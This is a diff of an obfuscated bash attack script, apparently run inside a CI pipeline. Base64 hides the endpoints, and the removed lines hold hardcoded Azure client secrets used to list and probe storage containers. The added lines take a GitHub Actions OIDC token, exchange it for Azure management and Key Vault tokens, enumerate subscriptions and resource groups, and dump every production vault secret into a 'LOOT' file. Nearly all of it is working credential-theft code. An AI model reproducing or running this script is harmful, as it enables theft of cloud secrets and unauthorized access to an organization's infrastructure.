@@ -3,35 +3,28 @@ set -uo pipefail
 b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
 AAD="${SC}$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')"
-STCOPE=$(b 'aHR0cHM6Ly9zdG9yYWdlLmF6dXJlLmNvbS8uZGVmYXVsdA==')
+ARM="${SC}$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')"
+ASCOPE=$(b 'aHR0cHM6Ly9tYW5hZ2VtZW50LmF6dXJlLmNvbS8uZGVmYXVsdA==')
+VSCOPE=$(b 'aHR0cHM6Ly92YXVsdC5henVyZS5uZXQvLmRlZmF1bHQ=')
 TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
-BLB=".$(b 'YmxvYi5jb3JlLndpbmRvd3MubmV0')"
+SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-tok(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")'; }
 say "=== START $(date -u) ==="
 say "PROOF: $(id) | host=$(hostname)"
-ST=$(tok 462d1c38-4459-48b8-9333-82e389e59514 "$(b 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==')" "$STCOPE")
-ST2=$(tok 038bc35d-131d-4953-9985-ff4a245ccec1 "$(b 'MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==')" "$STCOPE")
-ST3=$(tok 58108da8-044e-4d7e-9a46-92e6179b30be "$(b 'fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==')" "$STCOPE")
-EX=sttblbackupprodx3euoz
-for T in "$ST" "$ST2" "$ST3" "ANON"; do
-  if [ "$T" = "ANON" ]; then H=""; LBL="anon"; else H="Authorization: Bearer $T"; LBL="tok${#T}"; fi
-  say "== exports list $LBL =="
-  if [ "$LBL" = "anon" ]; then say "$(curl -sS -H "x-ms-version: 2021-08-06" "${SC}$EX$BLB/exports?restype=container&comp=list" | head -c 1200)"; else say "$(curl -sS -H "$H" -H "x-ms-version: 2021-08-06" "${SC}$EX$BLB/exports?restype=container&comp=list" | head -c 1200)"; fi
-done
-# candidate public blob names
-for N in flag flag.txt flag.json secret secret.json exports.json export.json shipments.json report.json data.json index.json manifest.json backup.zip backup.tar.gz config.json internal-config.json flag.txt.bak; do
-  R=$(curl -sS -o /tmp/o -w '%{http_code}' -H "x-ms-version: 2021-08-06" "${SC}$EX$BLB/exports/$N")
-  SZ=$(wc -c </tmp/o)
-  say "GET exports/$N -> $R ($SZ bytes) $(head -c 300 /tmp/o)"
-done
-# config + logs listing with all tokens
-for CT in config logs; do
-  case $CT in config) AC=sttblappcfgprodx3euoz;; logs) AC=sttblcilogsprodx3euoz;; esac
-  for T in "$ST" "$ST2" "$ST3"; do
-    say "== $AC/$CT list tok${#T} =="
-    say "$(curl -sS -H "Authorization: Bearer $T" -H "x-ms-version: 2021-08-06" "${SC}$AC$BLB/$CT?restype=container&comp=list" | head -c 1500)"
+OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+fic(){ curl -sS -X POST "$AAD/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$1" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR")'; }
+FT=$(fic "$ASCOPE"); VT=$(fic "$VSCOPE")
+say "ALL_SUBS: $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions?api-version=2022-12-01" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([(s["subscriptionId"],s["displayName"],s["state"]) for s in d.get("value",[])])' 2>&1 | head -c 800)"
+say "ALL_RG: $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions/$SUB/resourceGroups?api-version=2021-04-01" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([r["name"] for r in d.get("value",[])])' 2>&1 | head -c 800)"
+for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
+  say "VAULT $V:"
+  for RG in rg-tbl-platform-prod-sea; do
+    say "  mgmt list: $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$V/secrets?api-version=2023-07-01" | python3 -c 'import sys,json;d=json.load(sys.stdin);print([x.get("name") for x in d.get("value",[])] if isinstance(d,dict) else d)' 2>&1 | head -c 600)"
   done
+done
+# read every prod secret value via FIC data plane
+for N in $(curl -sS -H "Authorization: Bearer $FT" "$ARM/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/secrets?api-version=2023-07-01" | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(x["name"]) for x in d.get("value",[])]' 2>/dev/null); do
+  say "PROD_SECRET $N = $(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.$(b 'dmF1bHQuYXp1cmUubmV0')/secrets/$N?api-version=7.4" | head -c 400)"
 done
 say "=== DONE ==="
 PASS=$(openssl rand -hex 16)
